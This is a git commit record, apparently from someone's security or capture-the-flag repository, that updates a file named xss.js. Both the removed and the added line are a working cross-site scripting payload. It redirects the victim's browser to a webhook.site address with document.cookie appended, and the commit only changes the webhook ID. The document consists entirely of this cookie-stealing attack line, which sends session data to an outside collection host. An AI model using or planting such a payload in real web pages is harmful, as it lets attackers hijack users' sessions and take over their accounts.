07a61f844b85735133f24c1e17f7972bc30ed600
Sechack <57826302+Sechack06@users.noreply.github.com>
2022-05-05 01:22:39 +0900

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-document.location.href="https://webhook.site/1b746543-c148-4860-964e-53d8b238c975?cookie="+document.cookie
+document.location.href="https://webhook.site/1855d456-6586-4950-98d6-5b342a9c88a1?cookie="+document.cookie
